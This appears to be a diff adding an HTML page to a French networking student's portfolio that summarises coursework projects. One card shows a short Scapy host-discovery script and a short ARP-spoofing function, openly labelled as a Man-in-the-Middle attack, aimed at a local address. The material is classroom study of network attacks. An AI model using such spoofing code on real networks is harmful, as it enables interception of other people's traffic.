@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+<script>
+(function () {
+  if (localStorage.getItem('theme') === 'dark') {
+    document.documentElement.classList.add('dark');
+    window.addEventListener('DOMContentLoaded', () => {
+      document.body.classList.add('dark');
+      var ch = document.getElementById('theme-checkbox');
+      if (ch) ch.checked = true;
+    });
+  }
+})();
+</script>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>UE x.3 – Programmer | Portfolio Omar Chouffai</title>
+
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div id="scroll-progress"></div>
+  <div id="custom-cursor"></div>
+
+  <div id="main-content">
+    <header>
+      <div class="container nav-open-toggle">
+        <span class="logo">Omar Chouffai</span>
+        <nav>
+          <a href="index.html">← Retour aux UE</a>
+          <a href="ue-cyber4.html">Prochain UE →</a>
+        </nav>
+        <div class="header-controls">
+          <div class="theme-switch-container">
+            <input type="checkbox" id="theme-checkbox">
+            <label for="theme-checkbox" class="label">
+              <span class="icon-sun">🌞</span>
+              <span class="icon-moon">🌜</span>
+            </label>
+          </div>
+          <span class="nav-toggle">☰</span>
+        </div>
+      </div>
+    </header>
+
+    <section class="hero reveal">
+      <div class="container">
+        <h1>UE x.3 – Programmer&nbsp;: outils &amp; applications R&amp;T</h1>
+        <p>Au sein de cette UE, nous avons appris à concevoir, coder et tester des applications communicantes, à traiter et valoriser les données réseau et à industrialiser nos développements via la gestion de version et l’intégration continue ; ces acquis couvrent les composantes essentielles CE3.01 à CE3.05.</p>
+      </div>
+    </section>
+
+    <section class="reveal">
+      <div class="container">
+        <div class="grid grid-2">
+
+          <!-- SAÉ1.04 -->
+          <div class="card no-tilt reveal">
+            <h3>SAÉ1.04 – Se présenter sur Internet</h3>
+            <p class="small">Compétence : Identité numérique &amp; e-réputation</p>
+
+            <h4>Description</h4>
+            <p>Réflexion sur l’identité numérique, création d’une page personnelle
+               et présentation d’un centre d’intérêt / projet.</p>
+
+            <h4>Preuves &amp; traces</h4>
+            <ul>
+              <li>Site du projet :
+                  <a href="https://ochf21.github.io/portfolio/" target="_blank">
+                    ochf21.github.io/portfolio</a></li>
+            </ul>
+
+            <h4>Exemple de pratique sécurisée</h4>
+            <p><strong>Construction de l’identité numérique</strong> :<br>
+               Ensemble des traces en ligne (profils, commentaires, photos…).</p>
+            <p><strong>Gestion de l’e-réputation</strong> :<br>
+               Réservation, recrutement ; importance des avis et contenus publics.</p>
+
+            <h4>Mise en œuvre</h4>
+            <ul>
+              <li>Portfolio pour consigner les bonnes pratiques.</li>
+              <li>Page de présentation personnelle (cadre professionnel).</li>
+              <li>Centre d’intérêt : résumé en anglais.</li>
+            </ul>
+
+            <h4>Conclusion</h4>
+            <p>Compétences : gestion identité numérique, création web pro,
+               amélioration e-réputation.<br>
+               Importance de séparer public / privé et produire un contenu positif.</p>
+          </div>
+
+          <!-- SAÉ1.05 -->
+          <div class="card no-tilt reveal">
+            <h3>SAÉ1.05 – Traiter des données</h3>
+            <p class="small">Compétence : Programmation réseau (Scapy)</p>
+
+            <h4>Description</h4>
+            <p>Scripts Python avec <strong>Scapy</strong> : découverte d’hôtes et
+               attaque Man-in-the-Middle.</p>
+
+            <h4>Projet&nbsp;1 – Découverte automatique des hôtes</h4>
+            <p>Options : <code>-a</code> (ICMP actif) · <code>-p</code> (ARP passif)
+               · <code>-t</code> (test plage) · <code>-x</code> (export).</p>
+
+<pre><code class="language-python">from scapy.all import *
+def discover_hosts_active(ip):
+    ans, unans = sr(IP(dst=ip)/ICMP(), timeout=2)
+    for snd, rcv in ans:
+        print(f"{rcv.src} is up")
+    if unans:
+        print(f"No response from {unans.summary()}")
+</code></pre>
+
+            <h4>Projet&nbsp;2 – Attaque MITM (ARP Spoofing)</h4>
+<pre><code class="language-python">from scapy.all import *
+def arp_spoof(target_ip, host_ip):
+    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=host_ip)
+    send(packet, verbose=False)
+
+# Exécution
+arp_spoof("192.168.1.2", "192.168.1.1")
+</code></pre>
+
+            <h4>Conclusion</h4>
+            <p>Compétences : analyse &amp; manipulation de paquets, scripts Scapy,
+               compréhension des attaques potentielles.</p>
+          </div>
+
+          <!-- SAÉ2.04 -->
+          <div class="card no-tilt reveal">
+            <h3>SAÉ2.04 – Projet intégratif</h3>
+            <p class="small">Compétence : Gestion &amp; configuration réseau local</p>
+
+            <h4>Description</h4>
+            <p>Maquette réseau VLAN, téléphonie SIP, collecte MQTT et appli
+               Web pour visualiser les données.</p>
+
+            <h4>Preuves &amp; traces</h4>
+            <ul>
+              <li>Topologie réseau, découpage IP, DHCP, NAT, ACL.<br>
+                  <img src="images/sae204_topologie.png" alt="Topologie réseau" class="card-image"></li>
+              <li>VLAN Voix / Utilisateurs / Serveurs / Admin.<br>
+                  <img src="images/sae204_vlans.png" alt="VLANs" class="card-image"></li>
+              <li>Collecte MQTT en temps réel.<br>
+                  <img src="images/sae204_mqtt.png" alt="Collecte MQTT" class="card-image"></li>
+                  <img src="images/sae204_mqtt1.png" alt="Collecte MQTT" class="card-image"></li>
+            </ul>
+
+            <h4>Exemples de pratiques sécurisées</h4>
+            <ul>
+              <li><strong>Réseau</strong> : segmentation VLAN.</li>
+              <li><strong>Téléphonie</strong> : authentification SIP.</li>
+              <li><strong>Données</strong> : chiffrement MQTT.</li>
+              <li><strong>Web</strong> : contrôle d’accès, auth utilisateur.</li>
+            </ul>
+
+            <h4>Conclusion</h4>
+            <p>Acquis : admin réseau, VoIP, MQTT, Django/MySQL.<br>
+               Importance de la séparation des responsabilités et de la sécurité
+               sur chaque couche.</p>
+          </div>
+
+          <!-- SAÉ3.02 -->
+          <div class="card no-tilt reveal">
+            <h3>SAE3.02 – Apps communicantes</h3>
+            <p class="small"><em>Page en cours de préparation…</em></p>
+          </div>
+
+        </div>
+      </div>
+    </section>
+
+    <footer class="reveal">
+      <div class="container">
+        <p>&copy;&nbsp;2025 Omar Chouffai. Tous droits réservés.</p>
+      </div>
+    </footer>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/vanilla-tilt@1.7.2/dist/vanilla-tilt.min.js"></script>
+  <script src="script.js"></script>
+</body>
+</html>
+
